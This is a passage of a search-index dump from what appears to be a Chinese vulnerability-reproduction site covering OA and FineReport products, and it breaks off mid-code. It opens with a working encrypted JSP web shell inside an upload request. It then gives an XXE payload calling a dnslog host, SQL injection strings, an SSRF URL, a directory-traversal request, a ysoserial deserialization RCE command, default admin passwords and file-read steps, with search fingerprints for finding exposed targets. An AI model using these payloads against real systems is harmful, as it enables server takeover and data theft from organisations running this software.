Content-Disposition: form-data; name=\"photo\"; filename=\"shell.jsp\" Content-Type: application/octet-stream \u003c%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%\u003e\u003c%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%\u003e\u003c%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%\u003e ------WebKitFormBoundarynNQ8hoU56tfSwBVU Content-Disposition: form-data; name=\"continueUpload\" 1 ------WebKitFormBoundarynNQ8hoU56tfSwBVU Content-Disposition: form-data; name=\"submit\" 上传继续 ------WebKitFormBoundarynNQ8hoU56tfSwBVU-- 通过抓包可查看上传的文件名，上传的目录为 /defaultroot/upload/information/ ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-smartupload.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-smartupload.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"万户OA TeleConferenceService XXE注入漏洞 ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-teleconferenceservice-xxe%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-teleconferenceservice-xxe%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 万户OA TeleConferenceService接口存在XXE注入漏洞，攻击者通过漏洞可以继续XXE注入获取服务器敏感信息 ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-teleconferenceservice-xxe%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-teleconferenceservice-xxe%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 万户OA ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-teleconferenceservice-xxe%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-teleconferenceservice-xxe%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"万户网络-ezOFFICE\" ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-teleconferenceservice-xxe%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-teleconferenceservice-xxe%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 产品页面 验证POC POST /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../TeleConferenceService \u003c?xml version=\"1.0\" encoding=\"UTF-8\" ?\u003e \u003c!DOCTYPE ANY [ \u003c!ENTITY xxe SYSTEM \"http://fep6kf.dnslog.cn\" \u003e]\u003e \u003cvalue\u003e\u0026xxe;\u003c/value\u003e ","date":"0001-01-01","objectID":"/%E4%B8%87%E6%88%B7oa-teleconferenceservice-xxe%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E4%B8%87%E6%88%B7oa-teleconferenceservice-xxe%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"信呼OA beifenAction.php 后台目录遍历漏洞 ","date":"0001-01-01","objectID":"/%E4%BF%A1%E5%91%BCoa-beifenaction.php-%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E4%BF%A1%E5%91%BCoa-beifenaction.php-%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 信呼OA beifenAction.php文件中调用了 getfilerows方法，导致了目录遍历漏洞，攻击者通过漏洞可以获取服务器上的文件信息 ","date":"0001-01-01","objectID":"/%E4%BF%A1%E5%91%BCoa-beifenaction.php-%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E4%BF%A1%E5%91%BCoa-beifenaction.php-%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 信呼OA \u003c= 2.3.2 ","date":"0001-01-01","objectID":"/%E4%BF%A1%E5%91%BCoa-beifenaction.php-%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E4%BF%A1%E5%91%BCoa-beifenaction.php-%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"信呼协同办公系统\" ","date":"0001-01-01","objectID":"/%E4%BF%A1%E5%91%BCoa-beifenaction.php-%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E4%BF%A1%E5%91%BCoa-beifenaction.php-%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 其中默认存在几个用户存在弱口令 123456 存在漏洞的文件为 webmain/system/beifen/beifenAction.php 查看 getfilerows() 方法，在 include/chajian/fileChajian.php 该方法遍历目录下的文件名并输出，登录后，发送请求包 POST /index.php?a=getdatssss\u0026m=beifen\u0026d=system\u0026ajaxbool=true folder=../../ ","date":"0001-01-01","objectID":"/%E4%BF%A1%E5%91%BCoa-beifenaction.php-%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E4%BF%A1%E5%91%BCoa-beifenaction.php-%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"华天动力OA 8000版 workFlowService SQL注入漏洞 ","date":"0001-01-01","objectID":"/%E5%8D%8E%E5%A4%A9%E5%8A%A8%E5%8A%9Boa-8000%E7%89%88-workflowservice-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E5%8D%8E%E5%A4%A9%E5%8A%A8%E5%8A%9Boa-8000%E7%89%88-workflowservice-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 华天动力OA 8000版 workFlowService接口存在SQL注入漏洞，攻击者通过漏洞可获取数据库敏感信息 ","date":"0001-01-01","objectID":"/%E5%8D%8E%E5%A4%A9%E5%8A%A8%E5%8A%9Boa-8000%E7%89%88-workflowservice-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E5%8D%8E%E5%A4%A9%E5%8A%A8%E5%8A%9Boa-8000%E7%89%88-workflowservice-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 华天动力OA 8000版 ","date":"0001-01-01","objectID":"/%E5%8D%8E%E5%A4%A9%E5%8A%A8%E5%8A%9Boa-8000%E7%89%88-workflowservice-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E5%8D%8E%E5%A4%A9%E5%8A%A8%E5%8A%9Boa-8000%E7%89%88-workflowservice-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"华天动力-OA8000\" ","date":"0001-01-01","objectID":"/%E5%8D%8E%E5%A4%A9%E5%8A%A8%E5%8A%9Boa-8000%E7%89%88-workflowservice-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E5%8D%8E%E5%A4%A9%E5%8A%A8%E5%8A%9Boa-8000%E7%89%88-workflowservice-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 产品页面 发送请求包验证漏洞 POST /OAapp/bfapp/buffalo/workFlowService HTTP/1.1 Host: 、 Accept-Encoding: identity Content-Length: 103 Accept-Language: zh-CN,zh;q=0.8 Accept: */* User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3 Connection: keep-alive Referer: http://www.baidu.com Cache-Control: max-age=0 \u003cbuffalo-call\u003e \u003cmethod\u003egetDataListForTree\u003c/method\u003e \u003cstring\u003eselect user()\u003c/string\u003e \u003c/buffalo-call\u003e ","date":"0001-01-01","objectID":"/%E5%8D%8E%E5%A4%A9%E5%8A%A8%E5%8A%9Boa-8000%E7%89%88-workflowservice-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E5%8D%8E%E5%A4%A9%E5%8A%A8%E5%8A%9Boa-8000%E7%89%88-workflowservice-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"启莱OA CloseMsg.aspx SQL注入漏洞 ","date":"0001-01-01","objectID":"/%E5%90%AF%E8%8E%B1oa-closemsg.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E5%90%AF%E8%8E%B1oa-closemsg.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 启莱OA CloseMsg.aspx文件存在SQL注入漏洞，攻击者通过漏洞可以获取数据库敏感信息 ","date":"0001-01-01","objectID":"/%E5%90%AF%E8%8E%B1oa-closemsg.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E5%90%AF%E8%8E%B1oa-closemsg.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 启莱OA ","date":"0001-01-01","objectID":"/%E5%90%AF%E8%8E%B1oa-closemsg.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E5%90%AF%E8%8E%B1oa-closemsg.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"启莱OA\" ","date":"0001-01-01","objectID":"/%E5%90%AF%E8%8E%B1oa-closemsg.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E5%90%AF%E8%8E%B1oa-closemsg.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 存在SQL注入的文件为 CloseMsg.aspx http://xxx.xxx.xxx.xxx/client/CloseMsg.aspx?user=' and (select db_name())\u003e0--\u0026pwd=1 使用SQLmap对参数 user 进行注入 ","date":"0001-01-01","objectID":"/%E5%90%AF%E8%8E%B1oa-closemsg.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E5%90%AF%E8%8E%B1oa-closemsg.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"启莱OA messageurl.aspx SQL注入漏洞 ","date":"0001-01-01","objectID":"/%E5%90%AF%E8%8E%B1oa-messageurl.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E5%90%AF%E8%8E%B1oa-messageurl.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 启莱OA messageurl.aspx文件存在SQL注入漏洞，攻击者通过漏洞可以获取数据库敏感信息 ","date":"0001-01-01","objectID":"/%E5%90%AF%E8%8E%B1oa-messageurl.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E5%90%AF%E8%8E%B1oa-messageurl.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 启莱OA ","date":"0001-01-01","objectID":"/%E5%90%AF%E8%8E%B1oa-messageurl.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E5%90%AF%E8%8E%B1oa-messageurl.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"启莱OA\" ","date":"0001-01-01","objectID":"/%E5%90%AF%E8%8E%B1oa-messageurl.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E5%90%AF%E8%8E%B1oa-messageurl.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 存在SQL注入的文件为 messageurl.aspx http://xxx.xxx.xxx.xxx/client/messageurl.aspx?user=' and (select db_name())\u003e0--\u0026pwd=1 使用SQLmap对参数 user 进行注入 ","date":"0001-01-01","objectID":"/%E5%90%AF%E8%8E%B1oa-messageurl.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E5%90%AF%E8%8E%B1oa-messageurl.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"启莱OA treelist.aspx SQL注入漏洞 ","date":"0001-01-01","objectID":"/%E5%90%AF%E8%8E%B1oa-treelist.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E5%90%AF%E8%8E%B1oa-treelist.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 启莱OA treelist.aspx文件存在SQL注入漏洞，攻击者通过漏洞可以获取数据库敏感信息 ","date":"0001-01-01","objectID":"/%E5%90%AF%E8%8E%B1oa-treelist.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E5%90%AF%E8%8E%B1oa-treelist.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 启莱OA ","date":"0001-01-01","objectID":"/%E5%90%AF%E8%8E%B1oa-treelist.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E5%90%AF%E8%8E%B1oa-treelist.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"启莱OA\" ","date":"0001-01-01","objectID":"/%E5%90%AF%E8%8E%B1oa-treelist.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E5%90%AF%E8%8E%B1oa-treelist.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 存在SQL注入的文件为 treelist.aspx http://xxx.xxx.xxx.xxx/client/treelist.aspx?user=' and (select db_name())\u003e0--\u0026pwd=1 使用SQLmap对参数 user 进行注入 ","date":"0001-01-01","objectID":"/%E5%90%AF%E8%8E%B1oa-treelist.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E5%90%AF%E8%8E%B1oa-treelist.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"帆软报表 2012 SSRF漏洞 ","date":"0001-01-01","objectID":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-2012-ssrf%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-2012-ssrf%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 帆软报表 2012 存在信息泄露漏洞，通过访问特定的Url获取造成SSRF ","date":"0001-01-01","objectID":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-2012-ssrf%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-2012-ssrf%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 帆软报表 2012 ","date":"0001-01-01","objectID":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-2012-ssrf%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-2012-ssrf%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 body=\"down.download?FM_SYS_ID\" ","date":"0001-01-01","objectID":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-2012-ssrf%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-2012-ssrf%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 漏洞验证Url为 /ReportServer?op=resource\u0026resource=0m0m6k.dnslog.cn ","date":"0001-01-01","objectID":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-2012-ssrf%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-2012-ssrf%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"帆软报表 2012 信息泄露漏洞 ","date":"0001-01-01","objectID":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-2012-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-2012-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 帆软报表 2012 存在信息泄露漏洞，通过访问特定的Url获取部分敏感信息 ","date":"0001-01-01","objectID":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-2012-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-2012-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 帆软报表 2012 ","date":"0001-01-01","objectID":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-2012-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-2012-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 body=\"down.download?FM_SYS_ID\" ","date":"0001-01-01","objectID":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-2012-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-2012-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 获取登录报表系统的IP http://xxx.xxx.xxx.xxx/ReportServer?op=fr_server\u0026cmd=sc_visitstatehtml\u0026showtoolbar=false 数据库信息泄露 http://xxx.xxx.xxx.xxx/ReportServer?op=fr_server\u0026cmd=sc_getconnectioninfo 后台默认口令 admin/123456 /ReportServer?op=fr_auth\u0026cmd=ah_login\u0026_=new%20Date().getTime() ","date":"0001-01-01","objectID":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-2012-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-2012-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"帆软报表 channel 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-channel-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-channel-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 帆软报表 channel 接口存在远程命令执行漏洞, 攻击者通过漏洞可以获取服务器权限，攻击服务器 ","date":"0001-01-01","objectID":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-channel-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-channel-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 帆软报表 ","date":"0001-01-01","objectID":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-channel-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-channel-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"Powered by 帆软\" ","date":"0001-01-01","objectID":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-channel-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-channel-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 验证POC java -jar ysoserial-1.5-su18-all.jar -g CommonsBeanutils1183NOCC -p 'EX-TomcatEcho' -ch \"cmd\" \u003e fine10.bin POST /webroot/decision/remote/design/channel HTTP/1.1 Content-Type: application/json Host: cmd: id Connection: close {{gzip(file(fine10.bin))}} ","date":"0001-01-01","objectID":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-channel-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-channel-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"帆软报表 V8 任意文件读取漏洞 CNVD-2018-04757 ","date":"0001-01-01","objectID":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-v8-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cnvd-2018-04757/:0:0","tags":null,"title":"","uri":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-v8-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cnvd-2018-04757/"},{"categories":null,"content":"漏洞描述 FineReport报表软件是一款纯Java编写的，集数据展示(报表)和数据录入(表单)功能于一身的企业级web报表工具。 FineReport v8.0版本存在任意文件读取漏洞，攻击者可利用漏洞读取网站任意文件。 ","date":"0001-01-01","objectID":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-v8-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cnvd-2018-04757/:1:0","tags":null,"title":"","uri":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-v8-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cnvd-2018-04757/"},{"categories":null,"content":"漏洞影响 FineReport \u003c v8.0 ","date":"0001-01-01","objectID":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-v8-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cnvd-2018-04757/:2:0","tags":null,"title":"","uri":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-v8-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cnvd-2018-04757/"},{"categories":null,"content":"网络测绘 body=\"isSupportForgetPwd\" ","date":"0001-01-01","objectID":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-v8-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cnvd-2018-04757/:3:0","tags":null,"title":"","uri":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-v8-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cnvd-2018-04757/"},{"categories":null,"content":"漏洞复现 出现漏洞的文件为 fr-applet-8.0.jar package com.fr.chart.web; import com.fr.base.FRContext; import com.fr.general.IOUtils; import com.fr.stable.CodeUtils; import com.fr.web.core.ActionNoSessionCMD; import com.fr.web.utils.WebUtils; import java.io.InputStream; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; public class ChartGetFileContentAction extends ActionNoSessionCMD { public ChartGetFileContentAction() { } public void actionCMD(HttpServletRequest var1, HttpServletResponse var2, String var3) throws Exception { String var4 = CodeUtils.cjkDecode(WebUtils.getHTTPRequestParameter(var1, \"resourcepath\")); if (!WebUtils.invalidResourcePath(var4)) { InputStream var5 = FRContext.getCurrentEnv().readResource(var4); String var6 = IOUtils.inputStream2String(var5); var6 = var6.replace('\\ufeff', ' '); WebUtils.printAsString(var2, var6); } } public String getCMD() { return \"get_geo_json\"; } } 使用request将文件名传入 调用cjkDecode函数解密文件名 使用invalidResourcePath函数校验文件是否存在 最后使用readResource函数读取文件传输到浏览器上 默认目录为resources 其中的privilege.xml里面存储了后台的用户名密码 \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cPrivilegeManager xmlVersion=\"20170715\" releaseVersion=\"8.0.0\" fsSystemManagerPassSet=\"true\" birthday=\"0\" male=\"false\"\u003e \u003crootManagerName\u003e \u003c![CDATA[admin]]\u003e\u003c/rootManagerName\u003e \u003crootManagerPassword\u003e \u003c![CDATA[___00520017004e002b004100b7004200250023007f003d003d005400e4001c0057]]\u003e\u003c/rootManagerPassword\u003e \u003cAP class=\"com.fr.privilege.providers.NoAuthenticationProvider\"/\u003e \u003cForwardUrl\u003e \u003c![CDATA[${servletURL}?op=fr_platform]]\u003e\u003c/ForwardUrl\u003e \u003cPVFILTER class=\"com.fr.fs.privilege.auth.BasePrivilegeFilter\"/\u003e \u003c/PrivilegeManager\u003e 加密函数 public static String passwordEncode(String var0) { StringBuilder var1 = new 